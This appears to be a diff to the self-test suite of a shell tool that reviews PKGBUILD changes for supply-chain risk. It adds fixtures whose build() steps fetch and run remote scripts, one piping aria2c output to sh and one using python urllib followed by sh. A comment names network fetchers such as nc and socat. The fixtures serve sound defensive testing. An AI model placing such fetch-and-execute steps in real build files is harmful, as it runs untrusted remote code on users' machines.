@@ -4623,6 +4623,20 @@ cmd_selftest() {
   tc_class pkgbuild-package-body-review review 2 \
     "$_kilo_old_pkg" "$_kilo_new_pkg" "$_old_src" "$_new_src"
 
+  # Alternative fetchers (aria2c, socat, nc, tftp, rsync, python urllib) are
+  # intentionally NOT name-blacklisted. The fail-closed classifier sends these
+  # added shell statements to review, not clean. These tests pin that behavior.
+  local _aria_new_pkg _pyurl_new_pkg _ansic_new_pkg
+  printf -v _aria_new_pkg 'pkgname=cls-pkg\npkgver=1.1\npkgrel=1\nsource=("https://example.com/pkg-1.tar")\nsha256sums=(%s)\nbuild() {\n  aria2c https://x.sh | sh\n}' "$_sum1"
+  printf -v _pyurl_new_pkg 'pkgname=cls-pkg\npkgver=1.1\npkgrel=1\nsource=("https://example.com/pkg-1.tar")\nsha256sums=(%s)\nbuild() {\n  python3 -c "import urllib.request; urllib.request.urlretrieve('"'"'https://x.sh'"'"', '"'"'/tmp/x.sh'"'"')"\n  sh /tmp/x.sh\n}' "$_sum1"
+  printf -v _ansic_new_pkg 'pkgname=cls-pkg\npkgver=1.1\npkgrel=1\nsource=($'"'"'https://example.com/pkg-1.tar'"'"')\nsha256sums=(%s)' "$_sum1"
+  tc_class alt-downloader-aria2c-review review 2 \
+    "$_old_basic" "$_aria_new_pkg" "$_old_src" "$_new_src"
+  tc_class alt-downloader-python-urllib-review review 2 \
+    "$_old_basic" "$_pyurl_new_pkg" "$_old_src" "$_new_src"
+  tc_class ansic-quote-source-array-review review 2 \
+    "$_old_basic" "$_ansic_new_pkg" "$_old_src" "$_new_src"
+
   # Inline assertion: the review detail now points at the build-logic line
   # (install -Dm755 ./bwrap), not the earlier license=() line, and the summary
   # is "package build instructions changed". First test to assert on the
@@ -4771,6 +4785,12 @@ cmd_selftest() {
   printf 'payload\n' >"$_mg_repo/evil.install"
   ta "makepkg-guard-untracked-script-blocks" 1 _mg_run
   rm -f "$_mg_repo/evil.install"
+  # Source tarballs are legitimate untracked artifacts in a clone dir; the guard
+  # only rejects untracked executable/script files (PKGBUILD/.SRCINFO/*.install/*.sh).
+  # Pin that a stale tarball does not block a guarded build.
+  touch "$_mg_repo/foo-1.0.tar.gz"
+  ta "makepkg-guard-untracked-tarball-allowed" 0 _mg_run
+  rm -f "$_mg_repo/foo-1.0.tar.gz"
   : >"$MANIFEST_FILE"
   ta "makepkg-guard-unstaged-dependency-blocks" 1 _mg_run
   printf 'guard-pkg\n' >"$MANIFEST_FILE"
